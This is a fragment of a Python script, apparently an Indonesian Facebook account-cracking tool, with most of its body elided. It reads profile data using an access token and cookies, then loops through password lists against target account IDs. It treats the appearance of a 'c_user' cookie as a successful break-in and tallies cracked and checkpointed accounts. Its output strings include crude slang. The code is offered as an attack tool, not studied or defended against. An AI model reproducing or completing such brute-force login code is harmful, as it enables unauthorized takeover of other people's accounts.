...
class Main:
	...
	def get_my_info(self):
		r = requests.get(f"https://www.facebook.com/profile.php?id=100065683282301,id&access_token={self.token}",cookies=self.coki).json()
	...
	def Menu(self):
		...
		print(
			f" >> Your Account: {info['ishiya']}, {info['id']} << " 
		)
		print(
			"""
	...
	def crack(self, user, password_list, url):
		...
		for pw in password_list:
			...
			if "c_user" in session.cookies.get_dict():
				...
				opsi.clear()
				break
			sys.stdout.write("\r### CRACK MULAI %s/%s OK/CP:-%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")
...
class Assets(Main):
	...
	def validate(self):
		...
		exit(
			" [program finished] crack finished, Latif Ganteng:v"
		)
